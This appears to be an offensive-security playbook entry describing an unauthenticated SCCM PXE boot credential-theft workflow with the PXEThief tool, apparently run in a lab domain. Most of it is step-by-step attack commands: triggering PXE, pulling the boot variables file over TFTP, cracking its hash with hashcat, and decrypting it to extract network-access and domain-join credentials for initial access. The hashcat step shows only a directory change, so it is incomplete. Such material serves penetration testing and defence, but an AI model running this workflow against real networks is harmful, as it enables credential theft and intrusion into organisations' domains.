# 17.13 SCCM PXEThief full workflow

> Coerce SCCM PXE boot variables via `PXEThief`, crack the hash, then decrypt NAA + domain-join + task-sequence secrets — unauthenticated.

## Overview

Unauthenticated PXE boot credential theft. PXEThief coerces a DHCP PXE request to the SCCM Distribution Point, downloads the encrypted boot variables file via TFTP, generates a hashcat-crackable hash, and after cracking decrypts the file to extract NAA credentials, domain join credentials, and task sequence secrets.

## Steps

- Run pxethief.py 2 <DP_IP> to trigger PXE and obtain the .boot.var file location
- Download the .boot.var file manually with tftp -i <DP_IP> GET
- Run pxethief.py 5 <varfile> to generate the hashcat hash ($sccm$aes128$...)
- Install the configmgr-cryptderivekey hashcat module and crack with -m 19850
- Run pxethief.py 3 <varfile> <password> to decrypt and extract credentials (NAA, domain join, task sequences)
- Extracted LAB\sccm_naa credentials and OSDJoinAccount/OSDJoinPassword are usable for initial access

## Commands

### Coerce PXE boot + get file location

```powershell
python .\pxethief.py 2 172.50.0.30
```

### Download boot.var via TFTP

```powershell
tftp -i 172.50.0.30 GET "\SMSTemp\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var" "2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var"
```

### Generate hashcat hash

```powershell
python .\pxethief.py 5 '.\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var'
```

### Install and run hashcat module

```bash
cd hashcat_pxe/
```

### Decrypt with cracked password

```powershell
python .\pxethief.py 3 '.\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var' "Password123!"
```
